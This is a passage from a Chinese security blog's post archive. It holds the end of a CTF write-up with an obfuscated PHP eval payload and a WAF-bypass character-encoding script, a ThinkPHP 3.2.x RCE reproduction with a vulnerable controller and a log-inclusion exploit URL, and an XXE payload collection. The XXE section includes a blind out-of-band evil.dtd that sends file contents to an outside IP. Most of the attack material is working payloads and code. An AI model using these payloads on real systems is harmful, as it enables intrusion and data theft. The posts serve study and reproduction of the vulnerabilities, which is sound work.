class="symbol">%</span><span class="number">7B3</span>%7D).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">2</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)).((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))<span class="symbol">%</span><span class="number">7B3</span>%7D)<span class="symbol">%</span><span class="number">26</span>(~(((<span class="number">1</span>).(<span class="number">7</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)%7C(((<span class="number">1</span>).(<span class="number">0</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D))%7C(((<span class="number">1</span>).(<span class="number">3</span>))<span class="symbol">%</span><span class="number">7B1</span>%7D)))()))%3B HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.156</span><span class="number">.140</span><span class="number">.90</span>:<span class="number">8081</span></span><br><span class="line">z: php -r <span class="string">"eval(base64_decode('JHByb2Nlc3MgPSBwcm9jX29wZW4oDQogJy9yZWFkZmxhZycsDQogW1sicGlwZSIsICJyIl0sWyJwaXBlIiwgInciXSxbInBpcGUiLCAidyJdXSwkcGlwZXMNCik7DQpmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KJGV4cCA9IGZyZWFkKCRwaXBlc1sxXSwgMTAyNCk7DQokZXhwID0gZXhwbG9kZSgiXG4iLCAkZXhwKVswXTsNCmZ3cml0ZSgkcGlwZXNbMF0sIGV2YWwoInJldHVybiAkZXhwOyIpLiJcbiIpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0KZWNobyBmcmVhZCgkcGlwZXNbMV0sIDEwMjQpOw0K'));"</span></span><br></pre></td></tr></table></figure>

<p>后面又看到了<a href="https://www.mrkaixin.top/posts/fbd7e4e1/#1-0-bypass-waf" target="_blank" rel="noopener">开心师傅的脚本</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" Python</span></span><br><span class="line"><span class="string">Author: Mrkaixin</span></span><br><span class="line"><span class="string">Date: 2020-05-30 21:32</span></span><br><span class="line"><span class="string">FileName: exp.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">word_dict = &#123;</span><br><span class="line">    <span class="string">"0"</span>: <span class="string">"((0).(0))"</span>,</span><br><span class="line">    <span class="string">"1"</span>: <span class="string">"((1).(0))"</span>,</span><br><span class="line">    <span class="string">"2"</span>: <span class="string">"((2).(0))"</span>,</span><br><span class="line">    <span class="string">"3"</span>: <span class="string">"((3).(0))"</span>,</span><br><span class="line">    <span class="string">"4"</span>: <span class="string">"((4).(0))"</span>,</span><br><span class="line">    <span class="string">"5"</span>: <span class="string">"((5).(0))"</span>,</span><br><span class="line">    <span class="string">"6"</span>: <span class="string">"((6).(0))"</span>,</span><br><span class="line">    <span class="string">"7"</span>: <span class="string">"((7).(0))"</span>,</span><br><span class="line">    <span class="string">"8"</span>: <span class="string">"((8).(0))"</span>,</span><br><span class="line">    <span class="string">"9"</span>: <span class="string">"((9).(0))"</span>,</span><br><span class="line">    <span class="string">"="</span>: <span class="string">"(((1).(0)))|(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"+"</span>: <span class="string">"((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"."</span>: <span class="string">"((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"&lt;"</span>: <span class="string">"(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"$"</span>: <span class="string">"(((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;"</span>,</span><br><span class="line">    <span class="string">"@"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"~"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">"&#123;"</span>: <span class="string">"(((0).(0)))|(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"&#125;"</span>: <span class="string">"(((0).(0)))|((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">","</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"("</span>: <span class="string">"(((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">")"</span>: <span class="string">"(((9).(0)))%26((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;"</span>,</span><br><span class="line">    <span class="string">"d"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"e"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"f"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"h"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"i"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"j"</span>: <span class="string">"((((((1).(1/!1))&#123;3&#125;)%26~((6).(1)))|((99999999999999999999).(1))&#123;4&#125;)%26(((4).(0))|((8).(0)))&#123;0&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"k"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"l"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="string">"((((4).(0)))%26((99999999999999999999).(1))&#123;1&#125;)|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"n"</span>: <span class="string">"(((99999999999999999999).(1))&#123;1&#125;)|(((1).(1/!1))&#123;3&#125;)%26~((6).(1))"</span>,</span><br><span class="line">    <span class="string">"o"</span>: <span class="string">"(((99999999999999999999).(1))&#123;4&#125;)|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"p"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((0).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"q"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((1).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"r"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"s"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((3).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((4).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"u"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((5).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"v"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((6).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"w"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((7).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"x"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"y"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((9).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"z"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((6).(1))|((8).(0))&#123;0&#125;|((2).(0))&#123;0&#125;"</span>,</span><br><span class="line">    <span class="string">"E"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"G"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">    <span class="string">"K"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"O"</span>: <span class="string">"((((2).(1/!1))&#123;1&#125;)%26~((8).(3)))|(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"B"</span>: <span class="string">"(((1).(1/!1))&#123;3&#125;)%26~((4).(1))"</span>,</span><br><span class="line">    <span class="string">"C"</span>: <span class="string">"((((1).(1/!1))&#123;3&#125;)%26~((4).(1)))|(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"A"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((8).(3))"</span>,</span><br><span class="line">    <span class="string">"I"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((2).(3))"</span>,</span><br><span class="line">    <span class="string">"H"</span>: <span class="string">"(((2).(1/!1))&#123;1&#125;)%26~((5).(3))"</span>,</span><br><span class="line">    <span class="string">"L"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((3).(3))"</span>,</span><br><span class="line">    <span class="string">"D"</span>: <span class="string">"(((2).(1/!1))&#123;2&#125;)%26~((2).(1))%26~((9).(1))"</span>,</span><br><span class="line">    <span class="string">"N"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%30).(1))"</span>,</span><br><span class="line">    <span class="string">"J"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%34).(1))"</span>,</span><br><span class="line">    <span class="string">"F"</span>: <span class="string">"(((1).(1/!1))&#123;2&#125;)%26~((%39).(1))"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">got = [i <span class="keyword">for</span> i <span class="keyword">in</span> word_dict.keys()]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里写上想要的，配合高师傅的脚本一起用最好</span></span><br><span class="line">iwant = string.ascii_letters + <span class="string">"_"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Or</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) | ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)|<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">And</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> need <span class="keyword">in</span> iwant:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> got:</span><br><span class="line">            <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> got:</span><br><span class="line">                <span class="keyword">if</span> flag == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">                d = chr(ord(i) &amp; ord(j))</span><br><span class="line">                <span class="keyword">if</span> d == need:</span><br><span class="line">                    <span class="comment"># print(d,i,j)</span></span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                    print(<span class="string">f"\"<span class="subst">&#123;d&#125;</span>\":\"(<span class="subst">&#123;word_dict[i]&#125;</span>)%26<span class="subst">&#123;word_dict[j]&#125;</span>\","</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">product</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># exp</span></span><br><span class="line">    exp = <span class="string">""</span></span><br><span class="line">    <span class="comment"># exp = "var"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i]&#125;</span>)."</span>)</span><br><span class="line">        <span class="keyword">elif</span> i.upper() <span class="keyword">in</span> got:</span><br><span class="line">            print(<span class="string">f"(<span class="subst">&#123;word_dict[i.upper()]&#125;</span>)."</span>)</span><br><span class="line">            <span class="comment"># print(i.upper() + word_dict[i.upper()])</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(i + <span class="string">"lost"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    And()</span><br><span class="line">    <span class="comment"># Or()</span></span><br><span class="line">    <span class="comment"># product()</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>tag1</tag>
        <tag>tag2</tag>
        <tag>tag3</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP3.2.x RCE复现</title>
    <url>/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ThinkPHP3-2-x-RCE复现"><a href="#ThinkPHP3-2-x-RCE复现" class="headerlink" title="ThinkPHP3.2.x RCE复现"></a>ThinkPHP3.2.x RCE复现</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。个人感觉这个漏洞虽然不如thinkphp本体的一些RCE漏洞影响范围大，但也算是提供了一个思路，对基于某些框架二次开发的系统，寻找其不规范的方法调用的思路还是值得学习的。</p><a id="more"></a>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://codeload.github.com/top-think/thinkphp/zip/refs/tags/3.2.3" target="_blank" rel="noopener">ThinkPHP3.2.3</a> Phpstudy8.1.1 PHP-5.6.9 Apache Windows10(<a href="https://www.kancloud.cn/manual/thinkphp/1678" target="_blank" rel="noopener">tp3手册</a>)</p>
<p>如果是linux可以用composer拉取环境( composer create-project topthink/thinkphp=3.2.3 tp3)</p>
<p>先访问<a href="http://xxx.xx/index.php" target="_blank" rel="noopener">http://xxx.xx/index.php</a> 生成项目文件</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714130932384.png" alt="image-20210714130932384"></p>
<p>然后在<code>\Application\Home\Controller\IndexController.class.php</code>写入demo代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($value=<span class="string">''</span>)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;assign($value);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;display();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>因为该漏洞利用的assign函数需要模板渲染，所以需要对应的模板文件，与demo相对应的文件路径：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">\A</span>pplication<span class="symbol">\H</span>ome<span class="symbol">\V</span>iew<span class="symbol">\I</span>ndex<span class="symbol">\i</span>ndex.html</span><br><span class="line">/*此处的Index目录和index.html文件需自己创建</span><br><span class="line">index.html的内容任意</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>借用玄甲安全实验室的一张图，整体看一下程序的执行流程</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210909094308482.png" alt="image-20210909094308482"></p>
<p>接下来分析具体的代码：</p>
<p><code>Application/Home/Controller/IndexController.class.php</code></p>
<p>assign方法中第一个变量可控</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714144552762.png" alt="image-20210714144552762"></p>
<p>跟进assign函数</p>
<p><code>ThinkPHP/Library/Think/Controller.class.php</code></p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145223478.png" alt="image-20210714145223478"></p>
<p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>中的assign函数，此时进入else分支，我们传进去的<code>$value</code>被赋值给<code>$this-&gt;tVar</code></p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145158360.png" alt="image-20210714145158360"></p>
<p>返回后进入display函数，注意这是一个无参调用</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714145819669.png" alt="image-20210714145819669"></p>
<p>调用的是<code>ThinkPHP/Library/Think/View.class.php</code>的display函数，开始解析并获取模板文件内容，此时模板文件路径和内容为空</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714150822344.png" alt="image-20210714150822344"></p>
<p>进入<code>ThinkPHP/Library/Think/View.class.php</code>的fetch函数后，会先判断模板存不存在，这也是为什么我们要创建模板文件的原因</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714151415868.png" alt="image-20210714151415868"></p>
<p>接着判断是不是php类型模板，不是进入else分支。接着$params 被赋值，var即为为我们传进去的日志路径，file为模板文件的路径。</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714151836840.png" alt="image-20210714151836840"></p>
<p>接着进入<code>ThinkPHP/Library/Think/Hook.class.php</code>的listen函数，经过一些判断，进入exec函数</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714152708275.png" alt="image-20210714152708275"></p>
<p>接着exec函数把$params带进<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>的run函数处理</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153315655.png" alt="image-20210714153315655"></p>
<p>进入<code>ThinkPHP/Library/Think/Template.class.php</code>的fetch函数</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153522998.png" alt="image-20210714153522998"></p>
<p>进入最后的load函数，$var不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，之后include该日志文件路径，造成文件包含。</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714153704479.png" alt="image-20210714153704479"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li><p>日志包含</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154206984.png" alt="image-20210714154206984"></p>
<p>日志在<code>Application/Runtime/Logs/Home</code>目录下</p>
<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210714154445495.png" alt="image-20210714154445495"></p>
<p>开启debug</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">请求不报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Home下</span><br><span class="line">请求会报错 日志文件在 Application<span class="regexp">/Runtime/</span>Logs/Common下</span><br></pre></td></tr></table></figure>

<p>关闭debug</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">请求不会报错 不会记录日志</span><br><span class="line">请求会报错 日志文件在 Application/Runtime/Logs/<span class="meta">Common</span>下</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>上传入口</p>
<p>利用系统自带的上传功能，上传包含shell的文件</p>
</li>
</ul>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://x.x.x.x/index.php?m=Home&amp;c=Index&amp;a=index&amp;value</span>[<span class="string">_filename</span>]=./Application/Runtime/Logs/Common/21<span class="emphasis">_07_</span>14.log</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/ThinkPHP3-2-x-RCE复现/image-20210716163001792.png" alt="image-20210716163001792"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ?st=529DABB1BC6F651382C9135EB552827AD43F0288831BAC943C5A6CE32F45F1B9F423FD767BD30EB98F9C2C6D962C1268BBC7A694FE6B1157BC89FD16D8EAEB81A3BD642BDC08DB57567E4C7B327B7134882308F36A811B338901B511ABC8BC487356659B2CD0C8417DBCFD448DE79A0E6611FC7DAA7F5F806AED95180ADE0D979653805D9BE2818C36432C242C346C258EB569D4B4EC38ACD08C5E03A09D4FAA34F60913522071EB3BEEED7BDB667730296BE92C3B10E13BA48209051A216A1E&vid=1688851206182100&cst=53928845F30E881CE4702F30E4E78E655B605169B1BF71E0E963E97B3C21D4A26131701E074B2422DE3B7150338D0234&deviceid=de960c8d-258f-4e7d-a333-c1e3dc351b70&version=3.1.8.3015&platform=win" target="_blank" rel="noopener">ThinkPHP3.2.x RCE漏洞通报</a> </p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>复现</tag>
        <tag>Thinkphp3</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE注入总结</title>
    <url>/2019/12/XXE%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><em>XXE即XML External Entity Injection，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）</em></p><p>这里主要是记录一些Payload</p><a id="more"></a>

<p>如果要自己复现的话，先检查自己是否安装php-xml</p>
<p><strong>一、有回显读本地敏感文件(Normal XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload:</em></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=./index.php"</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191218212649252.png" alt="image-20191218212649252"></p>
<p>这里一般会利用php伪协议进行编码，防止某些特殊字符导致报错</p>
<p><strong>二、无回显读取本地敏感文件(Blind OOB XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.103.62.94:8888/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219111929470.png" alt="image-20191219111929470"></p>
<p>这里需要注意的是读取的文件不能太大，否则会报错</p>
<p><img src="/2019/12/XXE注入总结/image-20191219112205187.png" alt="image-20191219112205187"></p>
<p>这里可以利用zlib压缩数据流</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=zlib.deflate/resource=index.php</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=php://filter/read=zlib.deflate/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXE注入总结/image-20191219194710329.png" alt="image-20191219194710329"></p>
<p><strong><em>decode.py</em></strong></p>
